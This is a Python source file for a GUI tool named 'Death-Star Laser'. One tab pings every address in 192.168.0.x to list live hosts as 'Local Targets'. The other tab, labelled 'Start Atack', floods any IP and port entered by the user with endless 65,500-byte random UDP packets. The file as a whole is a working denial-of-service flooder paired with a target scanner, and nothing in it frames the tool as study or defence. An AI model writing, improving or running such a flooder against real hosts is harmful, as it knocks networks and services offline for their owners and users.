import socket
import random
import time
import threading
import customtkinter
import os

from ping3 import ping
from PIL import Image
from colorama import Fore, Back, Style

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def writeTargetsInTextBox():
     netAddr = "192.168.0." #potentiell variabel
     global textBoxTargets, isSearchAktive, findTargetsButton,SearchProgress, terminateSearch
     terminateSearch = False
     findTargetsButton.configure(text = "End Search")
     textBoxTargets.delete("0.0", "end")
     line = 0
     for i in range(1,255):
          if terminateSearch:
               break

          SearchProgress.set(i/254)
          ip = netAddr + str(i)
          #print("scanning: " + str(ip))
          isthere = ping(ip, timeout=0.2)
          if isthere:
               try:
                    hostName = socket.gethostbyaddr(ip)
                    textBoxTargets.insert("0."+str(line), ip + ":\t" + hostName[0] + "\n")
               except:
                    textBoxTargets.insert("0."+str(line), ip + "\n")

               line = line + 1

     print("ende")
     isSearchAktive = False
     print("hi2")
     findTargetsButton.configure(text = "Start Search")
     print("hi3")
     SearchProgress.set(0)

def startSearch():
     global searchThread, isSearchAktive
     searchThread = threading.Thread(target = writeTargetsInTextBox)
     isSearchAktive = True
     searchThread.start()

def endSearch():
     global searchThread, isSearchAktive, terminateSearch
     terminateSearch = True
     if isSearchAktive:
          searchThread.join()

def toggelSearch():
     global isSearchAktive
     if isSearchAktive:
          endSearch()
     else:
          startSearch()

def atk():
     global isActive, entryIp, entryPort
     bytes = random._urandom(65500)
     ip = entryIp.get()
     port = int(entryPort.get())
     i = 0
     while isActive:
          sock.sendto(bytes,(ip, port))
          i = i + 1

def startAtk():
     global atkThread, isActive, startButton
     atkThread = threading.Thread(target=atk)
     isActive = True
     startButton.configure(text = "Stop Atack")
     atkThread.start()

def stopAtk():
     global isActive, atkThread, startButton
     isActive = False
     startButton.configure(text = "Start Atack")
     if atkThread != "":
          atkThread.join()
     atkThread = ""

def toggleState():
     global isActive
     if isActive:
          stopAtk()
     else:
          startAtk()

def cleanUp():
     endSearch()
     stopAtk()
     root.destroy()

isActive = False

atkThread = ""
searchThread = ""
isSearchAktive = False
terminateSearch = False

#GUI
customtkinter.set_appearance_mode("dark")
customtkinter.set_default_color_theme("green")

root = customtkinter.CTk()
root.protocol("WM_DELETE_WINDOW", cleanUp)
root.title("DSL")
root.geometry("500x400")

#bgImage=customtkinter.CTkImage(dark_image=Image.open("maxresdefault.jpg"), size=(500, 400))
#bgLabel = customtkinter.CTkLabel(root, text = "",image=bgImage)
tabview = customtkinter.CTkTabview(master=root)

tabview.add("Atack")
tabview.add("Local Targets")

##atk Tab
frameAtk = customtkinter.CTkFrame(master=tabview.tab("Atack"))
label = customtkinter.CTkLabel(master=frameAtk, text="Death-Star Laser", font=("Roboto", 24))
entryIp = customtkinter.CTkEntry(master=frameAtk, placeholder_text="Target Ip")
entryPort = customtkinter.CTkEntry(master=frameAtk, placeholder_text="Target Port")
startButton = customtkinter.CTkButton(master=frameAtk, text="Start Atack", command=toggleState)

#Targets Tab
frameTarget = customtkinter.CTkFrame(master=tabview.tab("Local Targets"))
textBoxTargets = customtkinter.CTkTextbox(master=frameTarget, height=200, width = 350)
SearchProgress = customtkinter.CTkProgressBar(frameTarget, orientation="horizontal")
SearchProgress.set(0)
findTargetsButton = customtkinter.CTkButton(master=frameTarget, text="Start Search", command=toggelSearch)

#atk Tab
tabview.pack()
#bgLabel.place(y = 0, x = 0)
frameAtk.pack(pady = 20, padx = 60)
label.pack(pady = 20, padx = 60)
entryIp.pack(pady = 20, padx = 60)
entryPort.pack(pady = 20, padx = 60)
startButton.pack(pady = 20, padx = 60)

#Local Targets Tab
frameTarget.pack()
textBoxTargets.pack(pady= 20, padx = 20)
SearchProgress.pack(pady = 20, padx = 60)
findTargetsButton.pack(pady = 20, padx = 60)

root.mainloop()